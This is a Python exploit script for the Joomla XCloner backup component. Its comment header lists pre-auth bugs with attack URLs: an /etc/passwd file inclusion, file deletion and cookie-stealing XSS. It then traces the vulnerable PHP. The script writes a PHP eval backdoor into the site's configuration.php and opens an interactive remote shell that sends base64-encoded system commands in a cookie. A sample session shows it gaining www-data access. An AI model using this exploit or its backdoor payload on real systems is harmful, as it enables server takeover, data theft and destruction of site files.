#!/usr/bin/python
#
# Joomla component (com_xcloner-backupandrestore) remote code execution exploit
# Vendor: http://www.xcloner.com/
#
# "Our true divinity is in our ability to create. And armed with the understanding of the symbiotic connections
# of life, while being guided by the emergent nature of reality, there is nothing we cannot do or accomplish."
# - Zeitgeist addendum
#
# Target Environment Settings:
# ============================
# register_globals = On/Off (doesnt matter)
#
# Description:
# ============
# XCloner is a Website Backup and Restore application designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!.
# XCloner design was specifically created to Generate custom backups of any LAMP website through custom admin inputs, and to be able to Restore
# the clone on any other location with the help of the automatic Restore script we provide, independent from the main package!
#
# XCloner Backup tool uses Open Source standards like TAR and Mysql formats so you can rest assured your backups can be restored in a variety
# of ways, giving you more flexibility and full control.
#
# Vulnerability List (wordpress/joomla) & Explanation:
# ====================================================
# Here is the list of pre - auth vulns o.O:
#
# Information Disclosure with phpinfo()
# http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/restore/XCloner.php?task=info
# http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/restore/XCloner.php?task=info
#
# Local File Inclusion:
# http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/cloner.cron.php?config=../../../../../../../../etc/passwd
# http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/cloner.cron.php?config=../../../../../../../../etc/passwd
#
# DoS/damage by calling unlink() on wordpress/joomla files:
# http://[target]/[wp path]/wp-content/plugins/xcloner-backup-and-restore/restore/XCloner.php?task=step2&output_path=[path]/[file]
# http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/restore/XCloner.php?task=step2&output_path=[path]/[file]
#
# XSS:
# http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/index2.php?option=com_cloner&mosmsg=<script>alert(document.cookie)</script>
# http://[target]/[path]/wp-content/plugins/xcloner-backup-and-restore/index2.php?username=adsc&password=dac&option=com_cloner
# ";alert(document.cookie)//&task=dologin&boxchecked=0&hidemainmenu=0
# http://[target]/[path]/administrator/components/com_xcloner-backupandrestore/index2.php?option=com_cloner&mosmsg=
# <script>alert(document.cookie)</script>
#
# Not to mention the post - auth bugs...... but the most potent, pre-auth rce (joomla only). Enough yip yap, here we go....
#
# By accessing the XCloner.php page, the webmaster is presented an important message: "Security Note: After restore delete the
# XCloner.php script from your server". So my understanding is that the vulnerable code in this file, is sitting on web servers
# without requiring authentication to access until a restore happens. o.O. Below is an explanation of the vulnerable code, sorry but
# this is going to be long:
#
# The XCloner.php script begins by setting the array element 'output_path' of $_CONFIG to our input on line 72:
#
# $_CONFIG['output_path'] = $_REQUEST['output_path'];
#
# Later on we see a simple switch on lines 134-150 on our task parameter
#
# switch ($_REQUEST[task]) {
#    case 'step2':
#         step2();
#         break;
#
# We follow the case "step2" switch and land into that function (step2()) defined on lines 178-?. Inside that function we set the
# $_CONFIG array to global. The attacker must make sure that they DO NOT set the 'DBcreated' or 'transfer_mode' variable to 'on' or '2'
# (respectively) as it will kill our script when if it fails to connect to the database or FTP server. This is important to note,
# you will see later on.
#
# function step2($file=""){
#
#     global $_CONFIG,$filepath ;
#     $DBcreated    = $_REQUEST[DBcreated];
#
#     if ($DBcreated=='on'){
#
#	-- snip --
#
#         $db = @mysql_connect($DBhostname, $DBuserName, $DBpassword) or die("<br />The database details provided are incor... blah blah
#
#	-- snip --
#
# if($_REQUEST[transfer_mode]==2){
#
#	-- snip --
#
#        // set up basic connection
#        $conn_id = @ftp_connect($_REQUEST[ftp_server], $_REQUEST[ftp_port]) or die("<span class='error'>Could not connect to .. blah blah
#
# We keep looking and we see something interesting on lines 473 - 483
#
#     if(($_REQUEST['do_database'] != 1) || ($_REQUEST['files_skip'] == 1)){
#         $config_file = $_CONFIG[output_path]."/configuration.php";
#         @chmod($config_file,0777);
#         @unlink($_CONFIG[output_path]."/administrator/backups/perm.txt");
#         if(($_CONFIG['sql_usefile'] == "database-sql.sql") and ($update_config))
#             if(write_config($config_file)){
#                 echo "<H2>Configuration updated!</H2>";
#             }else{
#                 echo "<span class='error'>Unable to write to configuration file $config_file... Aborting...</span>";return;
#             }
#         }
#
# So an attacker must ensure that our request does not contain any 'do_database' variable or have the 'files_skip' variable containing a
# value of '1'. If the attacker calls the configuration.php with a null byte (../../../../configuration.php%00) then the unlink() will be
# triggered and delete the config file we are trying to backdoor! So the attacker can specify the 'output_path' variable to
# '../../../../' instead and simply let the application append the 'configuration.php'. Now lets break down the call to write_config()
# which is defined at line 547
#
# function write_config($file){
# echo "made it here";
#     if(@$fp = fopen($file, "r")){
#         $config_data = "";
#         while(!feof($fp))
#               $config_data .= fread($fp, 1024);
#         fclose($fp);
#     }
#
# Ok so the script reads the file into $config_data variable.
#
#     if ($_REQUEST[DBcreated] == 'on'){
#
#         $config_data = str_replace("define('DB_HOST', '", "define('DB_HOST', '".$_REQUEST[mysql_server]."');#", $config_data);
#         $config_data = str_replace("define('DB_USER', '", "define('DB_USER', '".$_REQUEST[mysql_username]."');#
#
#             -- snip --
#
#     if($_REQUEST['transfer_mode'] == 2){
#         $config_data = str_replace('$'.'ftp_host =',"$"."ftp_host ='".$_REQUEST[ftp_server]."';#", $config_data);
#         $config_data = str_replace('$'.'ftp_port =',"$"."ftp_port ='".$_REQUEST[ftp_port]."';#", $config_
#
#             -- snip --
#
# Now if the 'DBcreated' variable is set to 'on' or the 'transfer_mode' variable is set to '2', the attacker can overwrite the configuration.php
# file with 'mysql_server', 'mysql_username' or 'ftp_server', 'ftp_port' variables etc. However, the beginning of the XCloner.php script will
# kill the execution simply because setting those values will force the code to make an authentication, fail (if credz are wrong) and then die.
#
# if we keep looking, from line 585 we see:
#
#     $config_data = str_replace('$'.'live_site =',"$"."live_site ='".$_REQUEST[output_url_pref]."://".$_REQUEST[output_url]."';#", $config_data);
#
#     if ($fp = fopen($file, "w")) {
#         fwrite( $fp, $config_data);
#         fclose( $fp );
#     } else {
#         return false;
#     } // if
#  return true;
# }
#
# This is not part of the if statements like before, so the attacker at this point can simply overwrite the '$live_site' variable contained
# within configuration.php with 'malicious' code by setting the 'output_url_pref' variable accordingly.
#
# Exploitation:
# =============
# Seems to be that joomla and wordpress both have the vulnerable code in their plugins however only joomla uses the $live_site
# variable in their configuration file.
#
# Simply set the backdoor in configuration.php against our target:
# http://[target]/[path]administrator/components/com_xcloner-backupandrestore/restore/XCloner.php?
# task=step2&output_url_pref=';+}+?>+<?php+eval($_GET['lol']);+?>&output_path=../../../../
# Execute our code:
# http://[target]/[path]/?lol=phpinfo();
# http://[target]/[path]/?lol=system("id");
#
# [mr_me@pluto xcloner]$ python 0day.py -p localhost:8080 -t 192.168.1.3 -d /webapps/joomla/
#
# 	| ----------------------------------------------------------------------------- |
# 	| Joomla component (com_xcloner-backupandrestore) remote code execution explo!t |
# 	| by mr_me - net-ninja.net ---------------------------------------------------- |
#
# (+) Testing proxy @ localhost:8080.. proxy is found to be working!
# (+) Targeting http://192.168.1.3/webapps/joomla/
# (!) Exploit working!
# (+) Droping to remote console (q for quit)
#
# mr_me@192.168.1.3# id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
#
# mr_me@192.168.1.3# q

import sys
import urllib
import re
import urllib2
import getpass
import base64
from optparse import OptionParser

usage = "./%prog [<options>] -t [target] -d [directory]"
usage += "\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d /joomla/"

parser = OptionParser(usage=usage)
parser.add_option("-p", type="string",action="store", dest="proxy",
                  help="HTTP Proxy <server:port>")
parser.add_option("-t", type="string", action="store", dest="target",
                  help="The Target server <server:port>")
parser.add_option("-d", type="string", action="store", dest="dirPath",
                  help="Directory path to the CMS")

(options, args) = parser.parse_args()

def banner():
	print "\n\t| ----------------------------------------------------------------------------- |"
	print "\t| Joomla component (com_xcloner-backupandrestore) remote code execution explo!t |"
	print "\t| by mr_me - net-ninja.net ---------------------------------------------------- |\n"

if len(sys.argv) < 5:
    banner()
    parser.print_help()
    sys.exit(1)

def testProxy():
	check = 1
	sys.stdout.write("(+) Testing proxy @ %s.. " % (options.proxy))
	sys.stdout.flush()
	try:
        	req = urllib2.Request("http://www.google.com/")
		req.set_proxy(options.proxy,"http")
		check = urllib2.urlopen(req)
    	except:
        	check = 0
        	pass
    	if check != 0:
        	sys.stdout.write("proxy is found to be working!\n")
        	sys.stdout.flush()
    	else:
        	print "proxy failed, exiting.."
        	sys.exit(1)

def interactiveAttack():
        print "(+) Droping to remote console (q for quit)\n"
        hn = "%s@%s# " % (getpass.getuser(), options.target)
        preBaseCmd = ""
        while preBaseCmd != 'q':
                preBaseCmd = raw_input(hn)
		preBaseCmdSetup = ("system(\"%s\");" % (preBaseCmd))
                cmdInBase64 = base64.b64encode(preBaseCmdSetup)
		cookieCmd = ("lol=%s;" % (cmdInBase64))
                resp = getServerResponse(options.target + options.dirPath, cookieCmd, None)
		result = resp.split("://")[0]
		print result

def getServerResponse(exploit, header=None, data=None):
	try:
		headers = {}
		if header != None:
			headers['Cookie'] = header
		if data != None:
			data = urllib.urlencode(data)
		req = urllib2.Request("http://"+exploit, data, headers)
		if options.proxy:
			req.set_proxy(options.proxy,"http")
		check = urllib2.urlopen(req).read()
	except:
		check = error.read()
	return check

def backdoorTarget():
	print "(+) Targeting http://%s%s" % (options.target, options.dirPath)
	phpShell = "'; } ?> <?php eval(base64_decode($_COOKIE['lol'])); ?>"
	backdoorReq = ("administrator/components/com_xcloner-backupandrestore/restore/XCloner.php")
	data = {'task':'step2', 'output_url_pref':phpShell, 'output_path':'../../../../'}
	req = options.target + options.dirPath + backdoorReq
	check = getServerResponse(req, None, data)

	if re.search("All should be done! Click here to continue...", check):
		print "(!) Exploit working!"
		interactiveAttack()
	else:
		print "(-) Exploit failed, exiting.."
		sys.exit(1)

def main():
	banner()
	if options.proxy:
		testProxy()
	backdoorTarget()

if __name__ == "__main__":
	main()